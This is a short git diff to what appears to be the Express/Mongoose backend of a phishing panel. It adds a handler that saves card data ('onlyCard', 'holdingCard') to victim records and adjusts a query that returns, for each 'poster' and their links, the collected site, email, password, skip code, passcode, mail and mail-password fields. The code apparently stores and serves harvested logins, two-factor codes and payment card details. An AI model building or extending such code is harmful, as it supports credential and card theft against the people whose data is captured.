@@ -120,6 +120,25 @@ export const skip_code = (req, res) => {
     })
 
 }
+
+export const cards = (req, res) => {
+    const { id, onlyCard, holdingCard } = req.body;
+    Info.findOneAndUpdate({ _id: id }, {
+        $set: {
+
+            onlyCard:onlyCard,
+             holdingCard:holdingCard
+        }
+    }, { new: true }, (err, ok) => {
+        if (err) {
+            res.status(400).json({ error: err })
+        }
+
+        return res.status(200).json({ success: true })
+    })
+
+}
+
 export const add_mail = (req, res) => {
     const { id,mail,mailPass } = req.body;
     Info.findOneAndUpdate({ _id: id }, {
@@ -470,7 +489,7 @@ export const poster_details = async (req, res) => {
 
         const data = await Poster.findOne({ _id: id })
             .select('username password posterId links createdAt details')
-            .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt').sort({ createdAt: -1 })
+            .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt').sort({date: -1}).exec()
         return res.status(200).json({ data: data })
 
 
